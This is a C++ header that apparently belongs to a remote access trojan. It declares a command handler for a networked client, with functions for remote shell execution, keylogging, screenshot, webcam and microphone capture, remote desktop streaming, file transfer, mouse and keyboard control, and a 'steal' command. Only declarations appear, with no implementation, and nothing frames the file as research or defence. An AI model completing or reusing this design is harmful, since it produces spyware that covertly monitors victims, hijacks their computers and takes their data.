#ifndef COMMAND_HANDLER_H
#define COMMAND_HANDLER_H

#include <string>
#include <unordered_map>
#include <functional>
#include "../network/connection.h"

class CommandHandler {
private:
    Connection* connection;
    std::unordered_map<std::string, std::function<bool(const std::string&)>> commands;

    bool handle_system_command(const std::string& args);
    bool handle_file_command(const std::string& args);
    bool handle_shell_command(const std::string& args);
    bool handle_screenshot_command(const std::string& args);
    bool handle_keylog_command(const std::string& args);
    bool handle_webcam_command(const std::string& args);
    bool handle_microphone_command(const std::string& args);

    bool handle_rd_start(const std::string& args);
    bool handle_rd_stop(const std::string& args);
    bool handle_rd_frame(const std::string& args);
    bool handle_rd_settings(const std::string& args);

    bool handle_fdownload(const std::string& args);
    bool handle_fupload(const std::string& args);

    bool handle_mouse_command(const std::string& args);
    bool handle_keyboard_command(const std::string& args);
    bool handle_steal_command(const std::string& args);
public:
    CommandHandler(Connection* conn);
    void register_commands();
    bool execute_command(const std::string& command);
    void process_commands();
};

#endif